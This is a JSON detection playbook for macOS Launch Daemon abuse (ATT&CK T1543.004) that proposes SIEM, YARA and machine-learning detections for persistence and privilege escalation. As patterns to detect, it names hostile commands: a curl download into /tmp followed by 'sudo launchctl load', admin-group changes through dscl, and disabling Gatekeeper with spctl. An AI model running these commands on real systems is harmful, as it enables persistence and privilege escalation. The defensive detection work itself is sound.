[
  {
    "information_requirement": "Is the adversary using Launch Daemons for persistence?",
    "tactic_id": "TA0003",
    "tactic_name": "Persistence",
    "indicators": [
      {
        "technique_id": "T1543.004",
        "name": "Launch Daemon",
        "evidence": [
          {
            "description": "The SHA256 hash of a newly created or modified plist file in `/Library/LaunchDaemons/`, or its associated executable, matches a known-malicious hash from a threat intelligence feed.",
            "data_sources": [
              "File Creation Events",
              "File Modification Events",
              "Threat Intelligence Feeds"
            ],
            "data_platforms": [
              "TBD"
            ],
            "nai": "File system logs from all company-managed macOS endpoints, specifically monitoring the `/Library/LaunchDaemons/` directory.",
            "action": [
              "Create a SIEM rule that triggers upon file creation or modification within `/Library/LaunchDaemons/`. The rule must parse the plist to get the executable path, compute the SHA256 hash for both the plist and its executable, and query a threat intelligence feed for the file paths and hashes. Generate a high-severity alert on any match.",
              "For all executables referenced by plists in `/Library/LaunchDaemons/`, query endpoint logs to calculate the prevalence (file hash count) across the macOS fleet. Flag any executable whose hash prevalence is below the 1st percentile for investigation as potentially novel malware.",
              "Train a supervised classification model (e.g., Random Forest) on features from Launch Daemons, including plist and binary file sizes, hash prevalence, code signing status, and binary entropy. Deploy the model to classify new or modified Launch Daemons as 'benign' or 'malicious' in near real-time."
            ]
          },
          {
            "description": "A Launch Daemon plist file in `/Library/LaunchDaemons/` references an executable in a non-standard, user-writable directory (e.g., `/tmp/`, `/Users/Shared/`), contains obfuscated arguments, or uses a name that is a minor variation of a legitimate system daemon.",
            "data_sources": [
              "File Creation Events",
              "File Modification Events",
              "File Content"
            ],
            "data_platforms": [
              "TBD"
            ],
            "nai": "The `/Library/LaunchDaemons/` directory on all macOS endpoints and the content of all plist files within it.",
            "action": [
              "Deploy a YARA rule to scan all new or modified plist files in `/Library/LaunchDaemons/`. The rule must detect patterns such as execution from `/tmp/` or `/Users/Shared/`, base64 or hex-encoded strings in ProgramArguments, or names that mimic legitimate daemons with slight misspellings or different capitalization (e.g., `com.apple.xprotect` vs. `com.apple.Xprotect`).",
              "For each new plist, calculate the Shannon entropy of its `ProgramArguments` and the Levenshtein distance between its name and a list of known legitimate daemon names. Establish baselines for these metrics. Alert when a plist's entropy exceeds the 95th percentile of the baseline or its name has a distance of 1-2 from a known-good name.",
              "Use a DBSCAN clustering algorithm on features extracted from all Launch Daemon plists, including executable path depth, number of arguments, average argument length, and a binary flag for the presence of keywords like `.sh`, `curl`, or `python`. Investigate any new plists that are marked as noise or form a new, small cluster."
            ]
          },
          {
            "description": "A process spawned by a newly created Launch Daemon initiates network connections to a known malicious C2 server, a newly registered domain (NRD), or exhibits a periodic, low-volume connection pattern (beaconing).",
            "data_sources": [
              "File Creation Events",
              "Process Execution Events",
              "Zeek conn.log",
              "Zeek dns.log"
            ],
            "data_platforms": [
              "TBD"
            ],
            "nai": "Network gateways, DNS resolvers, and process-level network logs on all macOS endpoints.",
            "action": [
              "Create a correlation rule that links file creation in `/Library/LaunchDaemons/` to subsequent process executions and network connections. Enrich destination IPs and domains from `Zeek conn.log` and `Zeek dns.log` with threat intelligence. Alert if the process connects to a known malicious indicator or a domain registered within the last 30 days.",
              "For each process spawned by a Launch Daemon, analyze its network connections in `Zeek conn.log`. Calculate the standard deviation of time between outbound connections (jitter) and the standard deviation of outbound data volume. Flag processes with jitter below the 5th percentile and volume standard deviation below the 5th percentile as potential C2 beaconing.",
              "Apply a Long Short-Term Memory (LSTM) autoencoder to the time-series data of network connections (bytes out, packets out, connection frequency) for each daemon-spawned process. Train the model on a baseline of normal daemon network activity. Anomaly scores exceeding a predefined threshold indicate a deviation from normal behavior, such as C2 or exfiltration."
            ]
          },
          {
            "description": "The file hash of an executable binary referenced by a pre-existing, legitimate Launch Daemon plist is modified, indicating a potential hijack where the original binary was replaced.",
            "data_sources": [
              "File Modification Events",
              "File Hash Database"
            ],
            "data_platforms": [
              "TBD"
            ],
            "nai": "Directories containing executables referenced by plists in `/Library/LaunchDaemons/` across all macOS endpoints.",
            "action": [
              "Maintain a 'golden' manifest of file paths and their corresponding SHA256 hashes for all executables referenced by plists in `/Library/LaunchDaemons/`. Run a scheduled query or a file integrity monitoring rule that alerts whenever a file modification occurs and the new hash does not match the manifest.",
              "For each executable referenced by a Launch Daemon, establish a historical baseline of its modification frequency. Legitimate software updates may cause periodic changes. Alert if the modification frequency for a specific file exceeds two standard deviations above its historical mean for a given time window (e.g., monthly).",
              "Train a one-class SVM model on features of legitimate file modification events, such as the parent process being a known software installer (`installer`, `system_installd`), the user context being root, and the time falling within a maintenance window. The model will flag any file modification events that do not conform to this 'normal update' profile as anomalous."
            ]
          }
        ]
      }
    ],
    "last_updated": "2025-09-30",
    "version": "2.3",
    "date_created": "2025-05-04",
    "contributors": [
      "Zachary Szewczyk",
      "Ask Sage"
    ]
  },
  {
    "information_requirement": "Has the adversary achieved privilege escalation via Launch Daemons?",
    "tactic_id": "TA0004",
    "tactic_name": "Privilege Escalation",
    "indicators": [
      {
        "technique_id": "T1543.004",
        "name": "Launch Daemon",
        "evidence": [
          {
            "description": "A plist file created in `/Library/LaunchDaemons/` or its associated executable is identified by hash, name, or content as a known privilege escalation tool or malware with privilege escalation capabilities.",
            "data_sources": [
              "File Creation Events",
              "Threat Intelligence Feeds",
              "YARA rule sets"
            ],
            "data_platforms": [
              "TBD"
            ],
            "nai": "File system and process logs on all macOS endpoints, with specific focus on monitoring `/Library/LaunchDaemons/`.",
            "action": [
              "Implement a SIEM rule to monitor file creation in `/Library/LaunchDaemons/`. On creation, hash the plist and its executable and compare them against a threat intelligence feed of macOS privilege escalation tools. Concurrently, scan the files with a YARA ruleset designed to detect such tools. Alert on any match.",
              "Analyze the string content of new plists and their executables. Calculate the term frequency-inverse document frequency (TF-IDF) score for keywords related to privilege escalation (e.g., `dscl`, `security`, `AuthorizationExecuteWithPrivileges`, `setuid`). A TF-IDF score exceeding the 98th percentile of a baseline from benign daemons indicates a high probability of malicious intent.",
              "Train a Naive Bayes classifier on the text content of plist files and the string dumps from their associated binaries. Use a labeled dataset of benign daemons versus known privilege escalation malware to teach the model to distinguish between them based on textual features. Classify all new daemons and alert on 'malicious' classifications."
            ]
          },
          {
            "description": "A process, especially one in a non-administrative user context, executes `sudo launchctl load` to load a plist from a non-standard path like `/tmp/` or `/Users/Shared/`.",
            "data_sources": [
              "Process Execution Events"
            ],
            "data_platforms": [
              "TBD"
            ],
            "nai": "Process execution logs, including full command-line arguments, from all company-managed macOS endpoints.",
            "action": [
              "Create a detection rule that searches process execution logs for the command-line string `sudo launchctl load` where the subsequent file path argument does not begin with `/System/Library/` or `/Library/`. This is a high-fidelity indicator of an attempt to load an unauthorized daemon with root privileges.",
              "Establish a baseline of user accounts and parent processes that normally execute `sudo launchctl`. Alert when this command is executed by a user for the first time or from a parent process not associated with software installation or system administration (e.g., `Terminal.app` is suspicious, `Microsoft Word.app` is highly suspicious).",
              "Use a Hidden Markov Model (HMM) to analyze sequences of commands executed by users. Train the model on normal user command sequences. A sequence such as `curl [URL] -o /tmp/evil.plist`, followed by `sudo launchctl load /tmp/evil.plist`, would be identified by the model as a highly improbable and suspicious sequence."
            ]
          },
          {
            "description": "A file is created in the root-only directory `/Library/LaunchDaemons/` by a process running with an effective user ID (EUID) other than 0 (root), indicating a permission bypass.",
            "data_sources": [
              "File Creation Events"
            ],
            "data_platforms": [
              "TBD"
            ],
            "nai": "File creation logs for the `/Library/LaunchDaemons/` directory on all macOS endpoints, ensuring logs contain the user context of the writing process.",
            "action": [
              "Implement a SIEM rule that triggers an alert on any file creation event within the `/Library/LaunchDaemons/` directory where the `process.euid` field (or equivalent) is not equal to `0`. This directly detects a privilege escalation vulnerability being exploited.",
              "Profile the parent processes that legitimately write to `/Library/LaunchDaemons/` (e.g., `installer`, `system_installd`). A file write to this directory from a parent process that is statistically rare (e.g., `bash`, `zsh`, `python`) or has never been seen before should generate a high-priority alert.",
              "Train a graph-based anomaly detection model on normal process lineage graphs that terminate in a write to `/Library/LaunchDaemons/`. A process chain originating from a user application like a browser or email client that leads to a write in this directory would be flagged as a structural anomaly in the process graph, indicating a likely exploit chain."
            ]
          },
          {
            "description": "A process launched by `launchd` with root privileges (UID 0) subsequently executes commands to create new administrative users, modify user privileges, or disable security controls.",
            "data_sources": [
              "Process Execution Events"
            ],
            "data_platforms": [
              "TBD"
            ],
            "nai": "Process execution logs, including parent process and user context, on all company-managed macOS endpoints.",
            "action": [
              "Create a correlation rule that looks for a process with parent `launchd` and UID 0 that then spawns a child process executing sensitive commands like `dscl . -create`, `dscl . -append /Groups/admin`, `sysadminctl`, or `spctl --master-disable`. Trigger an alert if these events occur within 5 minutes of each other.",
              "Baseline the frequency and argument patterns of administrative commands (`dscl`, `sysadminctl`, etc.). An execution of one of these commands by a process whose immediate parent is `launchd` (PID 1) and is not part of a known, approved script should be flagged as a high-risk statistical outlier.",
              "Model the sequence of commands executed by root processes spawned from `launchd`. Train a supervised classifier (e.g., a sequence-aware neural network) on labeled sequences of 'benign daemon activity' vs. 'malicious post-escalation activity'. A new sequence involving file modification followed by user creation would be classified as malicious."
            ]
          }
        ]
      }
    ],
    "last_updated": "2025-09-30",
    "version": "2.3",
    "date_created": "2025-05-04",
    "contributors": [
      "Zachary Szewczyk",
      "Ask Sage"
    ]
  }
]